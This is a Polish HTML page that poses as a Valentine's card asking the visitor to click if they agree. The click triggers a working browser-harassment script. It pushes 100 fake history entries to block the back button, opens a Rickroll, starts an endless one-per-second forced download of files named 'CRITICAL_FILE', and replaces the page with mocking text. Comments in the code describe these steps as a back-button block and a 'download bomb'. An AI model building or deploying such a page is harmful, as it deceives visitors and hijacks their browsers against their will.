<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Walentynka</title>
    <style>
        body { background: red; color: white; text-align: center; padding-top: 40vh; font-family: sans-serif; cursor: pointer; margin: 0; }
        h1 { font-size: 40px; }
    </style>
</head>
<body onclick="start()">
    <h1>chcesz zostacmoja walentynka</h1>
    <p>Kliknij gdziekolwiek, jesli tak</p>

    <script>
        function start() {
            // 1. Alert musi być pierwszy, żeby "zatrzymać" użytkownika
            alert("walentynka");

            // 2. Blokada przycisku wstecz
            for (let i = 0; i < 100; i++) {
                window.history.pushState({}, '', "#error_" + i);
            }

            // 3. Próba otwarcia Rickrolla (może zostać zablokowane przez popup blocker, ale kod pójdzie dalej)
            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");

            // 4. Bomba pobierania (To na iOS ZAWSZE wyrzuca okienka)
            setInterval(function() {
                const link = document.createElement('a');
                link.href = 'data:text/plain;base64,WFREU0E=';
                link.download = 'CRITICAL_FILE_' + Math.floor(Math.random() * 1000) + '.txt';
                link.click();
            }, 1000);

            // 5. Zmiana napisu na ekranie
            document.body.innerHTML = "<h1 style='font-size:100px;'>XDDDDDDDD</h1>";
            document.body.style.backgroundColor = "black";
        }
    </script>
</body>
</html>
